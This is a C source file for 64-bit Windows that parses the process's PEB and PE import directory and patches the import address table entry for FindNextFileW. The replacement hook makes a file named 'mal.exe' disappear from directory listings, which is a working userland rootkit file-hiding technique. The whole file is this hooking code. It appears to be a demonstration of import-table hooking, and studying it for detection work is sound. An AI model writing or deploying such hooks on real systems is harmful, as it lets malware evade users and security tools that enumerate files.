#include "hook.h"

#define DBG_PRINT(...) {char cad[512]; sprintf_s(cad, 512, __VA_ARGS__);  OutputDebugStringA(cad);}

#define OPCODE_JMP '\xe9'
#define DLL_TO_HOOK "api-ms-win-core-file-l1-1-0.dll"
#define PROC_TO_HOOK "FindNextFileW"

DWORD64 pImageBase = 0;
DWORD64 pImportDirectory = 0;
DWORD dwImportDirectorySize = 0;

typedef BOOL(*procFindNextFileW_t)(HANDLE, LPWIN32_FIND_DATAW);
procFindNextFileW_t pFindNextFileWHookReturn;

BOOL WINAPI hookFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) {
	WCHAR pwszMatchingFile[] = L"mal.exe";

	BOOL fIsSuccess = pFindNextFileWHookReturn(hFindFile, lpFindFileData);
	if (!fIsSuccess) {
		return fIsSuccess;
	}
	if (wcscmp(lpFindFileData->cFileName, pwszMatchingFile) == 0) {
		DBG_PRINT("The hook blocked the file %S", pwszMatchingFile);
		return pFindNextFileWHookReturn(hFindFile, lpFindFileData);
	}
	return fIsSuccess;
}

BOOL findImportDirectory() {
	if (pImageBase != 0 && pImportDirectory != 0 &&
		dwImportDirectorySize != 0) {
		return TRUE;
	}
	DWORD64 pTeb = __readgsqword(0x30);
	DWORD64 pPeb = *(DWORD64*)(pTeb + 0x60);
	pImageBase = *((DWORD64*)(pPeb + 0x10));
	DWORD dwPeOffset = *((DWORD*)(pImageBase + 0x3c));
	DWORD64 pPeBase = pImageBase + dwPeOffset;

	WORD wMachineType = *(WORD*)(pPeBase + 4);
	if (wMachineType != 0x8664) { // AMD64 (K8)
		DBG_PRINT("Not AMD64 format. aborting hooking.");
		return FALSE;
	}

	DWORD64 pOptionalHeader = pPeBase + 0x18;
	WORD wPeMagic = *(WORD*)(pOptionalHeader);
	if (wPeMagic != 0x020B) { // PE64
		DBG_PRINT("Not PE64 format. aborting hooking.");
		return FALSE;
	}
	DWORD dwImportDirectoryRva = *(DWORD*)(pOptionalHeader + 0x78);
	pImportDirectory = pImageBase + dwImportDirectoryRva;
	dwImportDirectorySize = *(DWORD*)(pOptionalHeader + 0x7c);

	return TRUE;
}

BOOL makeHook(LPCSTR pszModuleName, LPCSTR pszProcNameToHook, DWORD64 pHookToRun, DWORD64 *ppReturnAddressAfterHook) {
	DWORD64 pImportDirEntry, pDllName, pProcName;
	DWORD64 pImportLookupTable, pImportAdressTable, pDirAddr;
	DWORD dwDirSize, dwDllNameRva, dwProcNameRva, lpflOldProtect;

	pDirAddr = pImportDirectory;
	dwDirSize = dwImportDirectorySize;
	while (dwDirSize > 0x14) {
		dwDllNameRva = *(DWORD*)(pDirAddr + 0xc);
		pDllName = pImageBase + dwDllNameRva;

		if (strcmp((char*)pDllName, pszModuleName) == 0) {
			pImportLookupTable = pImageBase + *(DWORD*)pDirAddr;
			pImportAdressTable = pImageBase + *(DWORD*)(pDirAddr + 0x10);

			while (0 != (*(DWORD*)pImportLookupTable)) {
				dwProcNameRva = *(DWORD*)pImportLookupTable;
				pProcName = pImageBase + dwProcNameRva;
				pProcName += 2;

				if (strcmp((char*)pProcName, pszProcNameToHook) == 0) {
					if (!VirtualProtect((LPVOID)pImportAdressTable, 8, PAGE_READWRITE, &lpflOldProtect)) {
						DBG_PRINT("VirtualProtect failed. Error code %d\n", GetLastError());
					}
					*ppReturnAddressAfterHook = *(DWORD64*)pImportAdressTable;
					*((DWORD64*)pImportAdressTable) = pHookToRun;

					DBG_PRINT("Hook has been installed.");
					return TRUE;
				}
				pImportLookupTable += sizeof(DWORD64);
				pImportAdressTable += sizeof(DWORD64);
			}
		}

		pDirAddr += 0x14;
		dwDirSize -= 0x14;
	}
	DBG_PRINT("Couldn't locate requested module/proc.");
	return FALSE;
}

void hookMain() {
	HMODULE hDllToHook;
	LPVOID pProcToHook;

	if (!findImportDirectory()) {
		DBG_PRINT("Failed to hook.");
		return;
	}

	if (!makeHook(DLL_TO_HOOK, PROC_TO_HOOK, (DWORD64)hookFindNextFileW, (DWORD64*)&pFindNextFileWHookReturn)) {
		DBG_PRINT("Failed to hook.");
	}
}